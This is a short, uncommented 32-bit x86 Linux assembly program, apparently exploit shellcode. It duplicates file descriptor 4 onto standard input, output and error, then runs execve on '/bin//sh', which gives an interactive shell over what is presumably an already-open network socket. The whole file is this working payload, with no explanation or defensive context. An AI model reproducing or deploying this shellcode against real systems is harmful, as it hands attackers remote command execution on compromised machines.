.global main
main:
    xor %eax, %eax
    xor %ebx, %ebx
    xor %ecx, %ecx
    xor %edx, %edx

    movb $0x3f, %al
    movb $0x4, %bl
    movb $0x0, %cl
    int $0x80

    movb $0x3f, %al
    movb $0x4, %bl
    movb $0x1, %cl
    int $0x80

    movb $0x3f, %al
    movb $0x4, %bl
    movb $0x2, %cl
    int $0x80

    xor %eax, %eax
    xor %ebx, %ebx
    xor %ecx, %ecx
    xor %edx, %edx

    push %eax
    push $0x68732f2f
    push $0x6e69622f
    movl %esp, %ebx
    push %eax
    push %ebx
    movl %esp, %ecx
    movb $0xb, %al
    int $0x80

